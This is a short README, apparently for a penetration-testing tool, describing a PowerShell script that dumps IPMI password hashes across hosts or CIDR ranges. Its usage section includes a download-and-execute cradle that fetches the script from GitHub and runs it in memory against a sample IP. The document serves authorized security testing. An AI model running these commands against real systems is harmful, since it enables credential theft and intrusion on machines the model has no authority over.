## About

Simple ported script to perform IPMI password hash dumping using PowerShell for internal engagements.
The script uses the default port however this can be changed using the `-Port` parameter.

CIDR ranges are also supported with a default user list for ease of use, single usernames or alternative user files can be specified with the `-Users` parameter.

## Usage

Invoke-Expression usage:

```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/H4rk3nz0/Invoke-IPMIDump/main/Invoke-IPMIDump.ps1')

Invoke-IPMIDump -IP 10.10.1.1
```

Local usage:

```
. .\Invoke-IPMIDump.ps1

Invoke-IPMIDump -IP 10.10.1.1
```
